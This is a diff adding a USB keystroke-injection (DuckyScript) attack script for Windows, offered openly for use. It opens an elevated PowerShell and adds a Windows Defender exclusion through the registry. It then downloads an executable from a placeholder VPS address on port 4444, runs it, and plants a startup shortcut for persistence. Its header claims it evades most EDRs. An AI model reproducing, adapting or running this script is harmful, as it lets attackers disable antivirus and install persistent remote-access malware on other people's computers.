@@ -1,0 +1,49 @@
+REM Title: Cache Folder Exclusion & Payload Download + Persistence
+REM Author: zb0r
+REM Description: Opens PowerShell as admin, creates a folder in Windows/temp called Cache, adds exclusion in Defender, downloads the payload from VPS/ inside the Cache folder, executes it, and adds it to startup
+REM Target: Windows
+REM Note: This evades most EDRs. // Delay is too big for testing purposes, can be lowered significantly. // I removed every instance of my VPS.
+REM Note: replace VPSIPHERE with the IP of your VPS and the correct port (ex:4444) and the name of your payload (ex: Shelzy.exe)
+REM Version: 1.0
+
+REM Delay for system to recognize and be ready
+DELAY 2000
+DELAY 100
+GUI r
+DELAY 500
+STRING powershell
+DELAY 500
+CTRL SHIFT ENTER
+DELAY 1000
+LEFTARROW
+DELAY 1000
+ENTER
+DELAY 1500
+REM Create Cache folder in Windows/temp
+STRING mkdir "$env:windir\temp\Cache"
+ENTER
+DELAY 500
+
+REM Add exclusion in Defender for Cache folder via registry manipulation
+STRING Start-Process powershell -Verb RunAs -ArgumentList 'New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" -Name "C:\Windows\Temp\Cache" -Value "C:\Windows\Temp\Cache" -PropertyType String -Force'
+ENTER
+DELAY 500
+
+REM Download payload from VPS Invoke-WebRequest
+STRING Invoke-WebRequest -Uri "http://VPSIPHERE:4444/Shelzy.exe" -OutFile "$env:windir\temp\Cache\Shelzy.exe"
+ENTER
+DELAY 3000
+
+REM Execute the downloaded payload
+STRING Start-Process "$env:windir\temp\Cache\Shelzy.exe"
+ENTER
+DELAY 500
+
+REM Add Shelzy.exe to startup
+STRING $s=(New-Object -COM WScript.Shell).CreateShortcut("$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\Shelzy.lnk");$s.TargetPath="$env:windir\temp\Cache\Shelzy.exe";$s.Save()
+ENTER
+DELAY 500
+
+STRING EXIT
+DELAY 300
+ENTER
